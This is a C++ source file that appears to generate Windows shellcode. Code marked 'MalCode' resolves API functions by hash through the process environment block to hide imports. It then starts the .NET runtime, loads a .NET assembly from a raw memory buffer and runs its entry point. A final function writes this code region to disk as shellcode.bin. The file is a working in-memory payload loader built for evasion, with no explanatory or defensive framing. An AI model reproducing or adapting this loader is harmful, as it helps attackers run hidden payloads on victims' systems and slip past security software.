#include "ScStdio.h"

#define ROR_SHIFT 13

namespace ScStdio {

	/*
		VS Compilation Switches:
		C/C++ -> Optimization -> /O1, /Ob2, /Oi, /Os, /Oy-, /GL
		C/C++ -> Code Generation -> /MT, /GS-, /Gy
		Linker -> General -> /INCREMENTAL:NO
	*/

#ifndef _WIN64
	__declspec(naked) void MalCodeBegin() { __asm { jmp MalCode } };
#else
	void MalCodeBegin() { MalCode(); }
#endif

	PPEB getPEB() {
		PPEB p;
#ifndef _WIN64
		p = (PPEB)__readfsdword(0x30);
#else
		p = (PPEB)__readgsqword(0x60);
#endif
		return p;
	}

	constexpr DWORD ct_ror(DWORD n) {
		return (n >> ROR_SHIFT) | (n << (sizeof(DWORD) * CHAR_BIT - ROR_SHIFT));
	}

	constexpr char ct_upper(const char c) {
		return (c >= 'a') ? (c - ('a' - 'A')) : c;
	}

	constexpr DWORD ct_hash(const char *str, DWORD sum = 0) {
		return *str ? ct_hash(str + 1, ct_ror(sum) + ct_upper(*str)) : sum;
	}

	DWORD rt_hash(const char *str) {
		DWORD h = 0;
		while (*str) {
			h = (h >> ROR_SHIFT) | (h << (sizeof(DWORD) * CHAR_BIT - ROR_SHIFT));
			h += *str >= 'a' ? *str - ('a' - 'A') : *str;
			str++;
		}
		return h;
	}

	LDR_DATA_TABLE_ENTRY *getDataTableEntry(const LIST_ENTRY *ptr) {
		int list_entry_offset = offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		return (LDR_DATA_TABLE_ENTRY *)((BYTE *)ptr - list_entry_offset);
	}

	PVOID getProcAddrByHash(DWORD hash) {
		PEB *peb = getPEB();
		LIST_ENTRY *first = peb->Ldr->InMemoryOrderModuleList.Flink;
		LIST_ENTRY *ptr = first;
		do {
			LDR_DATA_TABLE_ENTRY *dte = getDataTableEntry(ptr);
			ptr = ptr->Flink;

			BYTE *baseAddress = (BYTE *)dte->DllBase;
			if (!baseAddress)
				continue;
			IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)baseAddress;
			IMAGE_NT_HEADERS *ntHeaders = (IMAGE_NT_HEADERS *)(baseAddress + dosHeader->e_lfanew);
			DWORD iedRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
			if (!iedRVA)
				continue;
			IMAGE_EXPORT_DIRECTORY *ied = (IMAGE_EXPORT_DIRECTORY *)(baseAddress + iedRVA);
			char *moduleName = (char *)(baseAddress + ied->Name);
			DWORD moduleHash = rt_hash(moduleName);
			DWORD *nameRVAs = (DWORD *)(baseAddress + ied->AddressOfNames);
			for (DWORD i = 0; i < ied->NumberOfNames; ++i) {
				char *functionName = (char *)(baseAddress + nameRVAs[i]);
				if (hash == moduleHash + rt_hash(functionName)) {
					WORD ordinal = ((WORD *)(baseAddress + ied->AddressOfNameOrdinals))[i];
					DWORD functionRVA = ((DWORD *)(baseAddress + ied->AddressOfFunctions))[ordinal];
					return baseAddress + functionRVA;
				}
			}
		} while (ptr != first);

		return NULL;
	}

#define DEFINE_FUNC_PTR(module, function) \
	constexpr DWORD hash_##function = ct_hash(module) + ct_hash(#function); \
	typedef decltype(function) type_##function; \
	type_##function *##function = (type_##function *)getProcAddrByHash(hash_##function)

#define DEFINE_FWD_FUNC_PTR(module, real_func, function) \
	constexpr DWORD hash_##function = ct_hash(module) + ct_hash(real_func); \
	typedef decltype(function) type_##function; \
	type_##function *##function = (type_##function *)getProcAddrByHash(hash_##function)

	BOOL FindVersion40(char* buffer,size_t size){

		// Version sign
		char sign40[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
		char sign20[] = { 0x76,0x32,0x2E,0x30,0x2E,0x35,0x30,0x37,0x32,0x37 };
		char* assembly= (char*)buffer;

		for (size_t i = 0; i < size; i++)
		{
			for (size_t j = 0; j < 10; j++)
			{
				if (sign40[j] != assembly[i + j])
				{
					break;
				}
				else
				{
					if (j == (10 - 1))
					{
						return TRUE;//40
					}
				}
			}
		}

		return FALSE;
	}


	BOOL __stdcall MalCode(char* buffer ,size_t size) {

		// LoadLibrary GetProcAddress
		CHAR strMscoree[] = { 'm','s','c','o','r','e','e','.','d','l','l',0 };
		CHAR strOleAut32[] = { 'o','l','e','a','u','t','3','2','.','d','l','l',0 };
		CHAR strMsvcrt[] = { 'm','s','v','c','r','t','.','d','l','l',0 };
		DEFINE_FUNC_PTR("kernel32.dll", LoadLibraryA);
		LoadLibraryA(strMscoree);
		LoadLibraryA(strOleAut32);
		LoadLibraryA(strMsvcrt);
		DEFINE_FUNC_PTR("mscoree.dll", CLRCreateInstance);
		DEFINE_FUNC_PTR("OleAut32.dll", SafeArrayCreate);
		DEFINE_FUNC_PTR("OleAut32.dll", SafeArrayAccessData);
		DEFINE_FUNC_PTR("OleAut32.dll", SafeArrayUnaccessData);
		DEFINE_FUNC_PTR("OleAut32.dll", SafeArrayCreateVector);
		DEFINE_FUNC_PTR("msvcrt.dll", memcpy);
		DEFINE_FUNC_PTR("msvcrt.dll", memset);

		// Start Load .Net
		ICLRMetaHost* pMetaHost = NULL;
		HRESULT hr=S_OK;
		do 
		{
			// GUID
			GUID CLSID_CLRMetaHost = { 0x9280188d, 0xe8e, 0x4867, 0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde };
			GUID IID_ICLRMetaHost = {0xD332DB9E, 0xB9B3, 0x4125, 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16};
			GUID IID_ICLRRuntimeInfo = { 0xBD39D1D2, 0xBA2F, 0x486a, 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 };
			GUID CLSID_CorRuntimeHost = { 0xcb2f6723, 0xab3a, 0x11d2, 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e };
			GUID IID_ICorRuntimeHost = { 0xcb2f6722, 0xab3a, 0x11d2, 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e };
			GUID IID__AppDomain = { 0x05f696dc, 0x2b29, 0x3663, 0xad, 0x8b, 0xc4, 0x38, 0x9c, 0xf2, 0xa7, 0x13 };
			// Runtime Version
			WCHAR strRuntimeVersion40[] = { L'v',L'4',L'.',L'0',L'.',L'3',L'0',L'3',L'1',L'9',0 ,0};
			WCHAR strRuntimeVersion20[] = { L'v',L'2',L'.',L'0',L'.',L'5',L'0',L'7',L'2',L'7',0 ,0 };
			LPCWSTR strRuntimeVersion = strRuntimeVersion20;
			if (FindVersion40(buffer, size))
				strRuntimeVersion = strRuntimeVersion40;

			/* Get ICLRMetaHost instance */
			hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&pMetaHost);
			if (FAILED(hr))
				break;

			ICLRRuntimeInfo* pRuntimeInfo = NULL;
			/* Get ICLRRuntimeInfo instance */
			hr = pMetaHost->GetRuntime(strRuntimeVersion, IID_ICLRRuntimeInfo, (VOID**)&pRuntimeInfo);//L"v4.0.30319"
			if (FAILED(hr))
				break;

			BOOL bLoadable;
			/* Check if the specified runtime can be loaded */
			hr = pRuntimeInfo->IsLoadable(&bLoadable);
			if (FAILED(hr) || !bLoadable)
				break;

			ICorRuntimeHost* pRuntimeHost = NULL;
			/* Get ICorRuntimeHost instance */
			hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&pRuntimeHost);
			if (FAILED(hr))
				break;

			/* Start the CLR */
			hr = pRuntimeHost->Start();
			if (FAILED(hr))
				break;

			IUnknownPtr pAppDomainThunk = NULL;
			hr = pRuntimeHost->GetDefaultDomain(&pAppDomainThunk);

			if (FAILED(hr))
				break;

			_AppDomainPtr pDefaultAppDomain = NULL;
			/* Equivalent of System.AppDomain.CurrentDomain in C# */
			hr = pAppDomainThunk->QueryInterface(IID__AppDomain, (VOID**)&pDefaultAppDomain);
			if (FAILED(hr))
				break;

			_AssemblyPtr pAssembly = NULL;
			SAFEARRAYBOUND rgsabound[1];
			rgsabound[0].cElements = size;
			rgsabound[0].lLbound = 0;
			SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
			void* pvData = NULL;
			hr = SafeArrayAccessData(pSafeArray, &pvData);

			if (FAILED(hr))
				break;

			memcpy(pvData, buffer, size);

			hr = SafeArrayUnaccessData(pSafeArray);
			if (FAILED(hr))
				break;

			/* Equivalent of System.AppDomain.CurrentDomain.Load(byte[] rawAssembly) */
			hr = pDefaultAppDomain->Load_3(pSafeArray, &pAssembly);
			if (FAILED(hr))
				break;

			_MethodInfoPtr pMethodInfo = NULL;
			/* Assembly.EntryPoint Property */
			hr = pAssembly->get_EntryPoint(&pMethodInfo);
			if (FAILED(hr))
				break;

			VARIANT retVal;
			memset(&retVal, 0, sizeof(VARIANT));

			VARIANT obj;
			memset(&obj, 0, sizeof(VARIANT));
			obj.vt = VT_NULL;

			//TODO! Change cElement to the number of Main arguments
			SAFEARRAY *psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);

			/* EntryPoint.Invoke(null, new object[0]) */
			hr = pMethodInfo->Invoke_3(obj, psaStaticMethodArgs, &retVal);
			if (FAILED(hr))
				break;

			// SUCCESS!!!
			return TRUE;

		} while (false);

		return FALSE;
	}

#ifndef _WIN64
	__declspec(naked) void MalCodeEnd() { };
#else
	void MalCodeEnd() {};
#endif

	BOOL WriteShellcodeToDisk()
	{
		DWORD dwWritten;
		HANDLE FileHandle = CreateFileW(L"shellcode.bin", GENERIC_ALL, NULL, NULL, CREATE_ALWAYS, NULL, NULL);

		if (!FileHandle)
			return false;

		if (WriteFile(FileHandle, &MalCodeBegin, ((DWORD)&MalCodeEnd - (DWORD)&MalCodeBegin), &dwWritten, NULL))
		{
			CloseHandle(FileHandle);
			return true;
		}

		CloseHandle(FileHandle);
		return false;
	}
}